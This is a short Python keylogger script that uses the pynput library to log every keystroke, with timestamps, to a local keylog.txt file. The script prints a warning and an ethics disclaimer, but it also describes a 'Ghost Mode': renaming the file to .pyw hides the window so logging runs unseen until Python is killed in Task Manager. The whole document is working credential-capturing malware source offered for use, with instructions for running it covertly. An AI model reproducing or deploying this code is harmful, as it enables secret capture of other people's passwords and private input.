#Keylogger by Urmil Shroff

try:
    from pynput.keyboard import Key, Listener
    import logging
except:
    print("Please make sure Pynput is correctly installed on your system from https://github.com/moses-palmer/pynput")

print("WARNING: All your keyboard entries are currently being recorded and saved locally in keylog.txt\nYes, that includes every letter, number and anything else you click on your keyboard.\nPlease enter passwords and other sensitive information with care.")
print("\nYou can enter Ghost Mode and log the keyboard entries by renaming this file to keylogger.pyw, but then the only way to stop logging is to force stope python.exe in Task Manager.")
print("\nTo stop logging, close this window and force stop python.exe in Task Manager.")
print("\nDISCLAIMER: This is for personal, ethical use only. I will not be responsible for any misuse of this software in any way to cause any sort of damage or harm to any individual(s) or organization(s). Only you are to blame for what you do with it!")

output_dir="" #output will be saved in the same directory as keylogger.py file

logging.basicConfig(filename=(output_dir+"keylog.txt"),level=logging.DEBUG,format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()